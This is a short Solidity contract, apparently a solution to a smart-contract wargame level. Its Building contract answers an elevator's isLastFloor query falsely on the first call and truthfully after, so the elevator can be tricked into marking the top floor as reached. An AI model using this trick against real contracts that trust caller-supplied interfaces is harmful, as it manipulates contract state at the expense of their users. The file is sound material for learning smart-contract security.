// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    IElevator elevator;
    uint256 lastFloor = 10;
    uint256 count = 0;

    constructor(IElevator _elevator){
        elevator = _elevator;
    }

    function isLastFloor(uint256 _floor) public returns (bool){
        if(_floor == lastFloor && count == 0){
            count++;
            return false;
        }
        return true;
        //Alternatively, toggle between true and false on each function call e.g toggle = !toggle
    }

    function goTo(uint256 _floor) public{
        elevator.goTo(_floor);
    }
}